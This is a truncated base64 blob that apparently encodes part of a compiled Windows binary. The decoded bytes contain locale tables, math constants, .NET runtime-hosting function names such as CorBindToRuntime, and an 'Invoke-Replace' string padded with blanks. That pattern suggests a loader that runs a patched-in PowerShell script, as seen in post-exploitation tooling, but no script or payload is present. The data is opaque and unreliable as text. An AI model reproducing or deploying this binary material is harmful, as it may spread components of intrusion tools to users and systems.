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IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA